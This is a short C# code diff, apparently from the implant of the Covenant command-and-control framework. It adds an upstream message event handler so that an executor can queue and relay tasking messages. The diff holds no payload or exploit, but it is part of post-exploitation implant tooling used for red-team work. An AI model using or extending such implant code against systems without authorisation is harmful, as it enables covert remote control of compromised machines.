@@ -321,11 +321,17 @@ namespace BruteExecutor
         public string Message { get; set; }
     }
 
+    public class MessageEventArgs : EventArgs
+    {
+        public string Message { get; set; }
+    }
+
     public interface IMessenger
     {
         string Hostname { get; }
         string Identifier { get; set; }
         string Authenticator { get; set; }
+        EventHandler<MessageEventArgs> UpstreamEventHandler { get; set; }
         ProfileMessage Read();
         void Write(string Message);
         void Close();
@@ -388,6 +394,10 @@ namespace BruteExecutor
             this.Crafter = Crafter;
             this.UpstreamMessenger = Messenger;
             this.Profile = Profile;
+            this.UpstreamMessenger.UpstreamEventHandler += (sender, e) => {
+                this.QueueTaskingMessage(e.Message);
+                this.WriteTaskingMessage();
+            };
         }
 
         public GruntTaskingMessage ReadTaskingMessage()
@@ -489,6 +499,7 @@ namespace BruteExecutor
         public string Hostname { get; } = "";
         public string Identifier { get; set; } = "";
         public string Authenticator { get; set; } = "";
+        public EventHandler<MessageEventArgs> UpstreamEventHandler { get; set; }
 
         private string CovenantURI { get; }
         private CookieWebClient CovenantClient { get; set; } = new CookieWebClient();
